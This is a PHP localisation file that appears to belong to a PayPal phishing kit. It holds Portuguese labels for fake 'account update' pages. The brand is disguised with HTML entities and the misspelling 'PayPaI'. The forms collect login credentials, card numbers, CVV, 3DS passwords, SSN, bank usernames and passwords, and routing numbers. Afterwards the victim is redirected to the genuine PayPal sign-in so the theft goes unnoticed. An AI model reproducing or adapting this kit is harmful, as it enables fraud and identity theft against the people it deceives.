<?php 
//LOG
$log_ttl1="&#80;&#97;y&#80;&#97;I Atualização de conta";
$log_ttl2="segura";
$log_lab1="&#80;&#97;y&#80;&#97;I Página segura";
$log_lab2="Entre na sua conta";
$log_em="Endereço de e-mail";
$log_ps="Palavra-passe";
$log_frg="Esqueceu seu e-mail ou senha&nbsp;?";
$log_btn="Conecte-Se";
//FTR
$ftr_01="Respeito à privacidade";
$ftr_02="Acordos Legais";
$ftr_03="Contato";
$ftr_04="Socorro";
//INF
$inf_scr="Sua segurança é nossa prioridade";
$inf_ttspan="Informações da Conta Atualização";
$inf_lab1="Atualize seu endereço de cobrança";
$inf_corr="Digite seu endereço de cobrança corretamente.";
$inf_frnm="Seu primeiro nome";
$inf_lsnm="Seu Sobrenome";
$inf_dob="Data de aniversário DD/MM/AAAA";
$inf_add="Linha de endereço";
$inf_cty="Localidade/Cidade";
$inf_stt="Estado";
$inf_cnt="País";
$inf_zip="Código Postal";
$inf_mob="móvel";
$inf_hom="casa";
$inf_pho="O seu número de telefone";
$inf_con="Continuar";
//CRD
$crd_ttspan="Informações do cartão de Atualização";
$crd_lab1="Atualize o seu crédito/débito";
$crd_corr="Digite os seus de crédito/débito informações de cartões corretamente";
$crd_crdh="Titular do Cartão";
$crd_crdn="Número Do Cartão";
$crd_expd="Data De Validade MM/AA";
$crd_cv="CSC/CVV";
$crd_ttcv="Digite o seu código de verificação do cartão showen no cartão";
$crd_ptcv="./scr/csc";
$crd_wtcv="Qual é o código CSC ?";
$crd_ttptcv="Cartão de Código de Verificação - Ajuda";
$crd_cvp="CVV (ou valor de verificação do cartão) é um recurso de segurança anti-fraude que verifica se o cartão de crédito está na sua posse. Para a Visa / Mastercard, o número CVV três dígitos impressos no painel de assinatura nas costas do cartão depois de o número da conta. Para American Express, o número CVV de quatro dígitos é impresso na parte da frente da placa acima do número de conta.";
$crd_cvtd1="Há um número de 3 algarismos em itálico invertidas parte de trás do cartão de crédito.";
$crd_cvtd2="É um número de 4 dígitos na frente dos carros, um pouco acima do número do cartão de crédito.";
$crd_cvfrm="Fechar";
$crd_pcptcv="../../imcs_files/cv.png";
$crd_3ds="3DS VBV/MSC Senha";
$crd_acc="Número De Conta";
$crd_sn="SSN";
$crd_ttsn="Número da Segurança Social";
$crd_srt="Sort code";
$crd_ttptsrt="Sort code - Help";
$crd_ptsrt="./scr/srt/";
$crd_pcsrt="../../imcs_files/srt.png";
$crd_btn="Continuar";
//BNK
$bnk_ttspan="Informações do Banco Atualização";
$bnk_lab1="Atualize sua conta bancária";
$bnk_yrbn="O nome do banco:";
$bnk_corr="Digite suas informações bancárias corretamente.";
$bnk_id="Banco do usuário/ID";
$bnk_ps="Banco Senha";
$bnk_rt="Número De Roteamento";
$bnk_bt="Salvar";
//SCS
$scs_ttspan="Atualização de sucesso";
$scs_lnk="https://www.paypal.com/signin/?country.x=PT&locale.x=pt_PT";
$scs_tnk="Obrigado";
$scs_yrp="Sua conta PayPaI foi atualizado com sucesso.";
$scs_yhv="Você tem que re-login para salvar as alterações, você será redirecionado automaticamente para a página de login em 3 segundos ... Obrigado por usar nosso sistema de verificação.";
?>